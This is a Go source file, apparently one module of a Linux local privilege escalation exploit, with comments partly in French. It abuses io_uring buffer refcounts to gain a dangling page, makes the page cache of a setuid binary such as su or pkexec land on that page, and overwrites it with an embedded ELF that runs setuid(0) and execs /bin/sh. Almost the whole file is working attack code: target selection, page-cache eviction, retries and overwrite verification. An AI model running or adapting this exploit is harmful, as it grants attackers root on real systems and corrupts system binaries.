package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

const (
	targetPath          = "/usr/bin/su"
	gupPinCountingBias  = 1024
	maxRetries          = 5
)

var shellELF = []byte{
	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x03, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0xb0, 0x69, 0x0f, 0x05, 0x48, 0x8d,
	0x3d, 0xdb, 0xff, 0xff, 0xff, 0x6a, 0x00, 0x57, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0xb0, 0x3b, 0x0f,
	0x05,
}

var suidCandidates = []string{
	"/usr/bin/su",
	"/bin/su",
	"/usr/bin/mount",
	"/usr/bin/passwd",
	"/usr/bin/chsh",
	"/usr/bin/newgrp",
	"/usr/bin/umount",
	"/usr/bin/pkexec",
}

func logf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "\033[1;36m[*]\033[0m "+format+"\n", args...)
}

func okf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "\033[1;32m[+]\033[0m "+format+"\n", args...)
}

func errf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "\033[1;31m[-]\033[0m "+format+"\n", args...)
}

// getPagePFN retourne le page frame number d'une adresse virtuelle via pagemap.
// Retourne 0 si la page n'est pas presente ou en cas d'erreur.
func getPagePFN(va uintptr) uint64 {
	f, err := os.Open("/proc/self/pagemap")
	if err != nil {
		return 0
	}
	defer f.Close()
	idx := va / pageSize
	buf := make([]byte, 8)
	if _, err := f.ReadAt(buf, int64(idx*8)); err != nil {
		return 0
	}
	entry := binary.LittleEndian.Uint64(buf)
	if entry&(1<<63) == 0 {
		return 0
	}
	return entry & ((1 << 55) - 1)
}

// getSuPageCachePFN mmap su en MAP_SHARED et lit le PFN via pagemap.
func getSuPageCachePFN(target string) uint64 {
	fd, _, errno := syscall.RawSyscall(syscall.SYS_OPEN,
		func() uintptr {
			p, _ := syscall.BytePtrFromString(target)
			return uintptr(unsafe.Pointer(p))
		}(),
		syscall.O_RDONLY, 0)
	if errno != 0 {
		return 0
	}
	defer syscall.Close(int(fd))
	addr, _, errno := syscall.RawSyscall6(syscall.SYS_MMAP, 0, pageSize,
		syscall.PROT_READ, syscall.MAP_SHARED, fd, 0)
	if errno != 0 {
		return 0
	}
	// touch pour s'assurer que la page est dans le page table
	_ = *(*byte)(unsafe.Pointer(addr))
	pfn := getPagePFN(addr)
	syscall.RawSyscall(syscall.SYS_MUNMAP, addr, pageSize, 0)
	return pfn
}

func pinCPU(cpu int) error {
	// sched_setaffinity(0, sizeof(cpu_set_t)=128, &set)
	var set [128]byte
	set[cpu/8] |= 1 << (uint(cpu) % 8)
	_, _, errno := syscall.RawSyscall(syscall.SYS_SCHED_SETAFFINITY, 0, 128,
		uintptr(unsafe.Pointer(&set[0])))
	if errno != 0 {
		return fmt.Errorf("sched_setaffinity: %w", errno)
	}
	return nil
}

func findSuidTarget() string {
	for _, p := range suidCandidates {
		var st syscall.Stat_t
		if err := syscall.Stat(p, &st); err == nil && st.Mode&syscall.S_ISUID != 0 {
			okf("found suid target: %s", p)
			return p
		}
	}
	return ""
}

func backupTarget(path string) (string, error) {
	backup := fmt.Sprintf("/tmp/.backup_pintheft_%d", os.Getpid())
	logf("backing up %s -> %s", path, backup)
	src, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer src.Close()
	dst, err := os.OpenFile(backup, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		return "", err
	}
	defer dst.Close()
	buf := make([]byte, 65536)
	for {
		n, err := src.Read(buf)
		if n > 0 {
			dst.Write(buf[:n])
		}
		if err != nil {
			break
		}
	}
	okf("backup: %s", backup)
	return backup, nil
}

func evictPageCache(path string) error {
	fd, err := os.Open(path)
	if err != nil {
		return err
	}
	defer fd.Close()
	// posix_fadvise(fd, 0, PAGE_SIZE, POSIX_FADV_DONTNEED=4)
	_, _, errno := syscall.Syscall6(syscall.SYS_FADVISE64,
		fd.Fd(), 0, pageSize, 4, 0, 0)
	if errno != 0 {
		return fmt.Errorf("fadvise: %w", errno)
	}
	return nil
}

func createPayloadFile() (*os.File, error) {
	f, err := os.CreateTemp("", ".payload_pintheft_*")
	if err != nil {
		return nil, err
	}
	os.Remove(f.Name())
	page := make([]byte, pageSize)
	copy(page, shellELF)
	if _, err := f.Write(page); err != nil {
		f.Close()
		return nil, err
	}
	return f, nil
}

func spawnRingHolder(ring2Fd int) (int, error) {
	pid, _, errno := syscall.RawSyscall(syscall.SYS_FORK, 0, 0, 0)
	if errno != 0 {
		return 0, fmt.Errorf("fork: %w", errno)
	}
	if pid != 0 {
		return int(pid), nil
	}
	// child: hold ring2Fd, exec sleep
	syscall.RawSyscall(syscall.SYS_FCNTL, uintptr(ring2Fd), syscall.F_SETFD, 0)
	for fd := 0; fd < 1024; fd++ {
		if fd != ring2Fd {
			syscall.Close(fd)
		}
	}
	null, _ := syscall.Open("/dev/null", syscall.O_RDONLY, 0)
	_ = null
	null, _ = syscall.Open("/dev/null", syscall.O_WRONLY, 0)
	_ = null
	null, _ = syscall.Open("/dev/null", syscall.O_WRONLY, 0)
	_ = null
	syscall.Exec("/bin/sleep", []string{"sleep", "99999"}, []string{})
	syscall.Exit(0)
	return 0, nil
}

func mmapAnon(size uintptr, prot int) (uintptr, error) {
	addr, _, errno := syscall.RawSyscall6(syscall.SYS_MMAP, 0, size,
		uintptr(prot),
		syscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS,
		^uintptr(0), 0)
	if errno != 0 {
		return 0, fmt.Errorf("mmap: %w", errno)
	}
	return addr, nil
}

func attemptExploit(target string) (int, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	logf("=== exploit attempt ===")

	// 1. mmap page + PROT_NONE guard
	buf, err := mmapAnon(2*pageSize, syscall.PROT_READ|syscall.PROT_WRITE)
	if err != nil {
		return 0, err
	}
	// touch page
	*(*byte)(unsafe.Pointer(buf)) = 'A'

	// guard page
	if _, _, errno := syscall.RawSyscall(syscall.SYS_MPROTECT,
		buf+pageSize, pageSize, syscall.PROT_NONE); errno != 0 {
		syscall.Munmap((*[1 << 30]byte)(unsafe.Pointer(buf))[:2*pageSize])
		return 0, fmt.Errorf("mprotect guard: %w", errno)
	}
	okf("buf=%#x guard=%#x", buf, buf+pageSize)

	// 2. io_uring setup + REGISTER_BUFFERS
	ring, err := uringSetup(4)
	if err != nil {
		syscall.Munmap((*[1 << 30]byte)(unsafe.Pointer(buf))[:2*pageSize])
		return 0, err
	}
	if err := uringRegisterBuffers(ring, buf, pageSize); err != nil {
		uringDestroy(ring)
		syscall.Munmap((*[1 << 30]byte)(unsafe.Pointer(buf))[:2*pageSize])
		return 0, err
	}
	okf("buffers registered (refcnt +%d)", gupPinCountingBias)

	// 2b. clone to ring2 + daemon
	ring2, err := uringSetup(1)
	if err != nil {
		uringDestroy(ring)
		syscall.Munmap((*[1 << 30]byte)(unsafe.Pointer(buf))[:2*pageSize])
		return 0, err
	}
	if err := uringCloneBuffers(ring2, ring); err != nil {
		uringDestroy(ring2)
		uringDestroy(ring)
		syscall.Munmap((*[1 << 30]byte)(unsafe.Pointer(buf))[:2*pageSize])
		return 0, err
	}
	okf("cloned to ring2 (imu->refs=2)")

	daemon, err := spawnRingHolder(ring2.fd)
	if err != nil {
		uringDestroy(ring2)
		uringDestroy(ring)
		syscall.Munmap((*[1 << 30]byte)(unsafe.Pointer(buf))[:2*pageSize])
		return 0, err
	}
	uringDestroy(ring2) // parent closes ring2, daemon holds it
	okf("daemon pid=%d holds ring2", daemon)

	// 3. steal 1024 refs via failing zcopy sends
	logf("stealing %d refcounts...", gupPinCountingBias)
	stolen := 0
	for i := 0; i < gupPinCountingBias; i++ {
		port := portBase + i*2
		errno := stealOneRef(buf, port)
		if i < 3 {
			logf("  stealOneRef[%d] sendmsg errno=%d (%v)", i, errno, errno)
		}
		if errno == 0 || errno == syscall.EAGAIN || errno == syscall.EFAULT ||
			errno == syscall.ENOBUFS || errno == syscall.ECONNREFUSED {
			stolen++
		}
		if stolen%256 == 0 && stolen > 0 {
			logf("  stolen %d/%d", stolen, gupPinCountingBias)
		}
	}
	logf("stole %d/%d refs (refcnt ~%d)", stolen, gupPinCountingBias, 1025-stolen)
	if stolen < gupPinCountingBias-10 {
		errf("insufficient steals (%d/%d), aborting", stolen, gupPinCountingBias)
		uringDestroy(ring)
		return daemon, fmt.Errorf("insufficient steals: %d/%d", stolen, gupPinCountingBias)
	}

	// 4. evict target page cache
	logf("evicting %s page cache...", target)
	if err := evictPageCache(target); err != nil {
		errf("fadvise: %v", err)
	} else {
		okf("page cache evicted")
	}

	// Pre-open target BEFORE drain so open() doesn't run between munmap/pread
	targetBytes, _ := syscall.BytePtrFromString(target)
	rawTfd, _, errno2 := syscall.RawSyscall(syscall.SYS_OPEN,
		uintptr(unsafe.Pointer(targetBytes)), syscall.O_RDONLY, 0)
	if errno2 != 0 {
		uringDestroy(ring)
		return daemon, fmt.Errorf("open target: %w", errno2)
	}
	verifyBuf := make([]byte, pageSize)

	// 5. drain PCP (512 pages avec MAP_POPULATE)
	logf("draining PCP...")
	const drainCount = 512
	drainPages := make([]uintptr, drainCount)
	for i := range drainPages {
		addr, _, _ := syscall.RawSyscall6(syscall.SYS_MMAP, 0, pageSize,
			syscall.PROT_READ|syscall.PROT_WRITE,
			syscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS|syscall.MAP_POPULATE,
			^uintptr(0), 0)
		drainPages[i] = addr
	}

	// PFN de buf avant liberation
	bufPFN := getPagePFN(buf)
	logf("buf PFN avant munmap = %d (0x%x)", bufPFN, bufPFN)

	// Section critique : munmap puis pread en raw syscalls consecutifs
	// Aucun appel Go entre les deux pour eviter que le runtime vole notre page du PCP
	logf("munmap + pread (section critique)...")
	syscall.RawSyscall(syscall.SYS_MUNMAP, buf, pageSize, 0)
	syscall.RawSyscall6(syscall.SYS_PREAD64,
		rawTfd,
		uintptr(unsafe.Pointer(&verifyBuf[0])),
		pageSize, 0, 0, 0)
	syscall.RawSyscall(syscall.SYS_CLOSE, rawTfd, 0, 0)

	// PFN du page cache de su apres pread
	suPFN := getSuPageCachePFN(target)
	logf("su page cache PFN = %d (0x%x)", suPFN, suPFN)
	if bufPFN != 0 && suPFN != 0 {
		if bufPFN == suPFN {
			okf("PFN MATCH - notre page est bien le page cache de su!")
		} else {
			errf("PFN MISMATCH - buf=%d su=%d - PCP LIFO a echoue", bufPFN, suPFN)
		}
	}

	okf("page freed + page cache reclaimed")

	// free drain pages APRES la reclamation
	for _, dp := range drainPages {
		if dp != 0 {
			syscall.RawSyscall(syscall.SYS_MUNMAP, dp, pageSize, 0)
		}
	}

	// snapshot avant overwrite (lecture separee)
	before := make([]byte, 64)
	if snap, err2 := os.Open(target); err2 == nil {
		snap.ReadAt(before, 0)
		snap.Close()
	}
	logf("page[0..63] before: %x", before[:16])

	// 8. create payload file
	payloadFile, err := createPayloadFile()
	if err != nil {
		uringDestroy(ring)
		return daemon, err
	}

	// 9. READ_FIXED - write payload via dangling bvec
	logf("submitting IORING_OP_READ_FIXED...")
	if err := uringSubmitReadFixed(ring, int(payloadFile.Fd()), buf, pageSize); err != nil {
		payloadFile.Close()
		uringDestroy(ring)
		return daemon, err
	}

	res, err := uringWaitCQE(ring)
	payloadFile.Close()
	if err != nil {
		uringDestroy(ring)
		return daemon, err
	}
	if res < 0 {
		uringDestroy(ring)
		return daemon, fmt.Errorf("READ_FIXED CQE error: %d", res)
	}
	okf("READ_FIXED: %d bytes written via dangling bvec", res)

	// 10. verify
	logf("verifying overwrite...")
	check := make([]byte, len(shellELF))
	tfd2, err := os.Open(target)
	if err != nil {
		uringDestroy(ring)
		return daemon, err
	}
	tfd2.ReadAt(check, 0)
	tfd2.Close()

	for i, b := range shellELF {
		if check[i] != b {
			uringDestroy(ring)
			return daemon, fmt.Errorf("verify failed at byte %d: got %02x want %02x", i, check[i], b)
		}
	}
	okf("verification PASSED - page cache overwritten")

	uringDestroy(ring)
	return daemon, nil
}

func runLPE() (bool, []int) {
	if err := pinCPU(0); err != nil {
		errf("pin cpu: %v", err)
	} else {
		logf("pinned to CPU 0")
	}

	target := findSuidTarget()
	if target == "" {
		errf("no suid binary found")
		return false, nil
	}

	backup, err := backupTarget(target)
	if err != nil {
		errf("backup failed: %v", err)
		return false, nil
	}
	_ = backup

	var daemons []int
	for attempt := 0; attempt < maxRetries; attempt++ {
		logf("attempt %d/%d", attempt+1, maxRetries)
		daemon, err := attemptExploit(target)
		if daemon > 0 {
			daemons = append(daemons, daemon)
		}
		if err == nil {
			fmt.Fprintf(os.Stderr, "\n\033[1;33m=== RESTORE: sudo cp %s %s && sudo chmod u+s %s ===\033[0m\n",
				backup, target, target)
			return true, daemons
		}
		errf("attempt %d: %v", attempt+1, err)
		time.Sleep(time.Second)
	}
	return false, daemons
}
